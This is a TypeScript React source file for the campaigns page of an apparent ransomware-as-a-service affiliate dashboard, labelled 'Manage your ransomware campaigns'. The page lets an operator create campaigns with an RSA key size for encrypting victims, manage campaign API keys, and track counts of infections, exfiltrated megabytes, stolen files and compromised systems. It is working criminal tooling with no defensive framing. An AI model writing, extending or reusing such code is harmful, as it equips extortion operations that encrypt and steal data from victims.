'use client';

import { useState } from 'react';
import { 
  Building2, 
  Key, 
  Copy, 
  RotateCcw, 
  Trash2, 
  Edit2, 
  Plus,
  Search,
  Filter,
  Download,
  Eye,
  ExternalLink
} from 'lucide-react';
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/Card';
import { StatCard } from '@/components/ui/StatCard';
import { api } from '@/lib/api';
import { formatCurrency, formatNumber, formatDate, formatRelativeTime, cn } from '@/lib/utils';
import { useAffiliateStore } from '@/lib/store';

interface Campaign {
  id: string;
  name: string;
  description: string;
  apiKey: string;
  rsaKeySize: number;
  status: 'active' | 'paused' | 'archived';
  createdAt: string;
  updatedAt: string;
  stats: {
    totalInfections: number;
    totalFiles: number;
    totalBytes: number;
    lastActivity: string;
  };
  systemCount: number;
}

export default function CampaignsPage() {
  const [campaigns, setCampaigns] = useState<Campaign[]>([]);
  const [loading, setLoading] = useState(true);
  const [creating, setCreating] = useState(false);
  const [showCreateModal, setShowCreateModal] = useState(false);
  const [newCampaign, setNewCampaign] = useState({ name: '', description: '', rsaKeySize: 4096 });
  const [search, setSearch] = useState('');
  const [statusFilter, setStatusFilter] = useState<'all' | 'active' | 'paused' | 'archived'>('all');
  const { affiliate } = useAffiliateStore();

  const fetchCampaigns = async () => {
    try {
      setLoading(true);
      const data = await api.getCampaigns();
      setCampaigns(data.campaigns || []);
    } catch (error) {
      console.error('Failed to fetch campaigns:', error);
    } finally {
      setLoading(false);
    }
  };

  const handleCreate = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setCreating(true);
      const campaign = await api.createCampaign(newCampaign);
      setCampaigns([campaign, ...campaigns]);
      setShowCreateModal(false);
      setNewCampaign({ name: '', description: '', rsaKeySize: 4096 });
    } catch (error) {
      console.error('Failed to create campaign:', error);
    } finally {
      setCreating(false);
    }
  };

  const handleDelete = async (id: string) => {
    if (!confirm('Delete this campaign? This will remove all systems and files. Irreversible.')) return;
    try {
      await api.client.delete(`/api/affiliate/campaigns/${id}`);
      setCampaigns(campaigns.filter(c => c.id !== id));
    } catch (error) {
      console.error('Failed to delete campaign:', error);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const filteredCampaigns = campaigns.filter(c => {
    const matchesSearch = c.name.toLowerCase().includes(search.toLowerCase()) ||
                          c.id.toLowerCase().includes(search.toLowerCase());
    const matchesStatus = statusFilter === 'all' || c.status === statusFilter;
    return matchesSearch && matchesStatus;
  });

  if (loading) {
    return (
      <div className="space-y-6 animate-pulse">
        <div className="flex items-center justify-between">
          <div className="h-8 w-48 bg-chaos-border/20 rounded" />
          <div className="h-10 w-32 bg-chaos-border/20 rounded" />
        </div>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
          {[1, 2, 3].map(i => (
            <div key={i} className="card h-64 bg-chaos-border/20" />
          ))}
        </div>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
        <div>
          <h1 className="text-3xl font-bold text-gradient">Campaigns</h1>
          <p className="text-gray-400 mt-1">Manage your ransomware campaigns</p>
        </div>
        <button
          onClick={() => setShowCreateModal(true)}
          className="btn-primary flex items-center gap-2"
        >
          <Plus className="w-4 h-4" />
          New Campaign
        </button>
      </div>

      {/* Search & Filter */}
      <div className="card p-4 flex flex-col sm:flex-row gap-4">
        <div className="relative flex-1">
          <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
          <input
            type="text"
            placeholder="Search campaigns..."
            value={search}
            onChange={e => setSearch(e.target.value)}
            className="input-field pl-10"
          />
        </div>
        <select
          value={statusFilter}
          onChange={e => setStatusFilter(e.target.value as any)}
          className="input-field w-auto"
        >
          <option value="all">All Status</option>
          <option value="active">Active</option>
          <option value="paused">Paused</option>
          <option value="archived">Archived</option>
        </select>
      </div>

      {/* Campaign Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        {filteredCampaigns.map((campaign) => (
          <CampaignCard
            key={campaign.id}
            campaign={campaign}
            onDelete={handleDelete}
            onCopy={copyToClipboard}
          />
        ))}

        {filteredCampaigns.length === 0 && (
          <div className="col-span-full card text-center py-12">
            <Building2 className="w-12 h-12 text-gray-600 mx-auto mb-4" />
            <p className="text-gray-400">No campaigns found</p>
            <p className="text-sm text-gray-500 mt-1">Create your first campaign to get started</p>
          </div>
        )}
      </div>

      {/* Create Modal */}
      {showCreateModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
          <div className="card w-full max-w-md mx-4 animate-in">
            <CardHeader>
              <CardTitle>Create New Campaign</CardTitle>
            </CardHeader>
            <form onSubmit={handleCreate}>
              <CardContent className="space-y-4">
                <div>
                  <label className="block text-sm font-medium mb-1">Campaign Name</label>
                  <input
                    type="text"
                    value={newCampaign.name}
                    onChange={e => setNewCampaign({...newCampaign, name: e.target.value})}
                    className="input-field"
                    placeholder="e.g., Operation GoldenEye"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium mb-1">Description</label>
                  <textarea
                    value={newCampaign.description}
                    onChange={e => setNewCampaign({...newCampaign, description: e.target.value})}
                    className="input-field"
                    rows={3}
                    placeholder="Optional description..."
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium mb-1">RSA Key Size</label>
                  <select
                    value={newCampaign.rsaKeySize}
                    onChange={e => setNewCampaign({...newCampaign, rsaKeySize: parseInt(e.target.value)})}
                    className="input-field"
                  >
                    <option value={2048}>2048-bit (faster)</option>
                    <option value={4096}>4096-bit (more secure)</option>
                  </select>
                </div>
                <div className="flex gap-2 pt-4">
                  <button type="button" onClick={() => setShowCreateModal(false)} className="btn-secondary flex-1">Cancel</button>
                  <button type="submit" disabled={creating} className="btn-primary flex-1">
                    {creating ? 'Creating...' : 'Create Campaign'}
                  </button>
                </div>
              </CardContent>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}

function CampaignCard({ campaign, onDelete, onCopy }: { campaign: Campaign; onDelete: (id: string) => void; onCopy: (text: string) => void }) {
  const statusConfig = {
    active: { label: 'Active', className: 'badge-success' },
    paused: { label: 'Paused', className: 'badge-warning' },
    archived: { label: 'Archived', className: 'badge-neutral' },
  };

  const config = statusConfig[campaign.status];

  return (
    <div className="card relative overflow-hidden group">
      <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-chaos-gold to-chaos-goldHover opacity-0 group-hover:opacity-100 transition-opacity" />
      
      <div className="p-6 space-y-4">
        <div className="flex items-start justify-between">
          <div className="flex-1 min-w-0">
            <h3 className="text-lg font-semibold truncate">{campaign.name}</h3>
            <p className="text-sm text-gray-400 truncate mt-1">{campaign.description || 'No description'}</p>
          </div>
          <span className={cn('badge ml-2', config.className)}>{config.label}</span>
        </div>

        <div className="grid grid-cols-2 gap-4 text-center">
          <div className="glass rounded-lg p-3">
            <p className="text-2xl font-bold text-chaos-rose">{formatNumber(campaign.stats.totalInfections)}</p>
            <p className="text-xs text-gray-400">Infections</p>
          </div>
          <div className="glass rounded-lg p-3">
            <p className="text-2xl font-bold text-chaos-gold">{formatCurrency(campaign.stats.totalBytes / 1024 / 1024)} MB</p>
            <p className="text-xs text-gray-400">Exfiltrated</p>
          </div>
          <div className="glass rounded-lg p-3">
            <p className="text-2xl font-bold text-chaos-sky">{formatNumber(campaign.stats.totalFiles)}</p>
            <p className="text-xs text-gray-400">Files</p>
          </div>
          <div className="glass rounded-lg p-3">
            <p className="text-2xl font-bold text-chaos-emerald">{campaign.systemCount}</p>
            <p className="text-xs text-gray-400">Systems</p>
          </div>
        </div>

        <div className="pt-2 border-t border-chaos-border/30">
          <div className="flex items-center justify-between text-sm text-gray-400 mb-3">
            <span>API Key</span>
            <span className="font-mono text-xs">{campaign.apiKey.substring(0, 16)}...</span>
          </div>
          <div className="flex gap-2">
            <button
              onClick={() => onCopy(campaign.apiKey)}
              className="btn-secondary flex-1 flex items-center justify-center gap-2 text-sm"
              title="Copy API Key"
            >
              <Copy className="w-4 h-4" />
              Copy Key
            </button>
            <button
              onClick={() => {/* Regenerate key */}}
              className="btn-secondary flex-1 flex items-center justify-center gap-2 text-sm"
              title="Regenerate API Key"
            >
              <RotateCcw className="w-4 h-4" />
              Rotate
            </button>
          </div>
        </div>

        <div className="flex items-center justify-between text-xs text-gray-500 pt-3 border-t border-chaos-border/30">
          <span>Created: {formatDate(campaign.createdAt)}</span>
          <span>Updated: {formatRelativeTime(campaign.updatedAt)}</span>
        </div>

        <div className="flex gap-2 pt-3">
          <button className="btn-secondary flex-1 flex items-center justify-center gap-1 text-sm" title="View Details">
            <Eye className="w-4 h-4" />
            Details
          </button>
          <button 
            onClick={() => onDelete(campaign.id)}
            className="btn-danger flex-1 flex items-center justify-center gap-1 text-sm"
            title="Delete Campaign"
          >
            <Trash2 className="w-4 h-4" />
            Delete
          </button>
        </div>
      </div>
    </div>
  );
}